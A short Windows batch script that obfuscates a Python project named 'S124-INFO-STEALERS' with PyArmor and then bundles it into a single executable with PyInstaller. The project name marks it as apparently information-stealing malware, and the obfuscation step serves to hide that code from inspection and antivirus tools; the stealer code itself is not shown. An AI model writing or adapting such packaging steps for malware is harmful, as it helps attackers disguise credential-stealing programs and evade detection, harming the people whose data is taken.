@echo off

REM Step 1: Obfuscate the project
pyarmor-7 pack -x " --exclude S124-INFO-STEALERS --clean" S124-INFO-STEALERS

REM Step 2: Navigate to obfuscated project directory
cd dist\obf\S124-INFO-STEALERS\

REM Step 3: Convert to executable
pyinstaller --onefile main.py

6 
